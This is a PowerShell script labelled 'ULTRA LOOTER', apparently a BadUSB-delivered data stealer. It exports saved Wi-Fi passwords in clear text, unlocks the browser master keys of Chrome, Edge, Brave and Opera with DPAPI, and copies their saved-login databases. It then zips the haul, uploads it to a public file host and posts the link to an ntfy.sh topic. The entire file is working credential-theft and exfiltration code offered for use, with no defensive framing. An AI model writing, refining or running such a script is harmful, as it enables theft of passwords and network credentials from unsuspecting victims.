$topic = "data_stwealer_hideen_"
Write-Host "=== [ ULTRA LOOTER v2.1: STABLE ] ===" -ForegroundColor Cyan

# 1. Workspace Setup
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. WiFi Export (Plain Text)
Write-Host "[*] Exporting WiFi Profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Chromium Decryption & File Grabbing
$chromes = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

Write-Host "[*] Unlocking Browser Master Keys..." -ForegroundColor White
foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    if (Test-Path $path) {
        try {
            # Decrypt Master Key using Windows DPAPI
            $json = Get-Content $path -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\$browser`_MasterKey.txt"
            
            # Locate Database
            $dbPath = $path.Replace("Local State", "Default\Login Data")
            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
            
            if (Test-Path $dbPath) {
                # Copying to a .db file helps bypass the 'In Use' lock for Edge/Brave
                Copy-Item $dbPath -Destination "$dir\$browser`_LoginData.db" -Force -ErrorAction SilentlyContinue
            }
            Write-Host "    [+] $browser: Success" -ForegroundColor Green
        } catch { Write-Host "    [-] $browser: Locked/Failed" -ForegroundColor Red }
    }
}

# 4. Zipping and Uploading
Write-Host "[*] Sending to Cloud..." -ForegroundColor Yellow
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
    
    # --- THE SIGNAL (FIXED FOR COM ACCESS DENIED) ---
    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
    if ($portName) {
        # Using CMD to echo avoids the PowerShell SerialPort 'Access Denied' error
        cmd.exe /c "echo F > $portName"
    }
}

Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Read-Host "Press Enter to Clean and Exit..."
Remove-Item -Recurse -Force $dir, $zip
